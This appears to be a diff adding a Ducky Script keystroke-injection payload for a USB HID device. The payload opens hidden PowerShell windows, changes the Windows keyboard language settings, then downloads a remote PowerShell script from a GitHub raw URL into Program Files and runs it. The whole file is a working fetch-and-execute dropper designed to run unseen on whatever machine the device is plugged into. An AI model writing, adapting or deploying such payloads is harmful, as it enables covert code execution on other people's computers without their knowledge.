@@ -1,0 +1,61 @@
+DELAY 1000
+
+GUI r
+DELAY 250
+STRING PowerShell -WindowStyle hidden
+ENTER
+DELAY 500
+STRING Get-WinUserLanguageList | ConvertTo-Json | Out-File C:\WinUserLanguageList.json
+ENTER
+DELAY 500
+STRING Set-WinUserLanguageList -LanguageList en-US, ru -Force
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 250
+
+ALT SHIFT
+DELAY 250
+GUI r
+DELAY 250
+STRING PowerShell -WindowStyle hidden
+ENTER
+DELAY 500
+STRING Get-WinUserLanguageList | ConvertTo-Json | Out-File C:\WinUserLanguageList.json
+ENTER
+DELAY 500
+STRING Set-WinUserLanguageList -LanguageList ru, en-US -Force
+ENTER
+DELAY 500
+ALT SHIFT
+DELAY 250
+STRING exit
+ENTER
+DELAY 100
+
+GUI r
+DELAY 250
+STRING PowerShell -WindowStyle hidden
+ENTER
+DELAY 500
+STRING New-Item -Path 'C:\Program Files (x86)\Makaksi\Marduino' -ItemType Directory
+ENTER
+DELAY 500
+STRING $URL1="https://raw.githubusercontent.com/Mapagmataas1331/marduino/main/marduino.ps1"
+ENTER
+DELAY 500
+STRING $Path1="C:\Program Files (x86)\Makaksi\Marduino\marduino.ps1"
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -URI $URL1 -OutFile $Path1
+ENTER
+DELAY 2500
+STRING exit
+ENTER
+DELAY 250
+
+GUI r
+DELAY 250
+STRING PowerShell -noexit "& ""C:\Program Files (x86)\Makaksi\Marduino\marduino.ps1"""
+ENTER
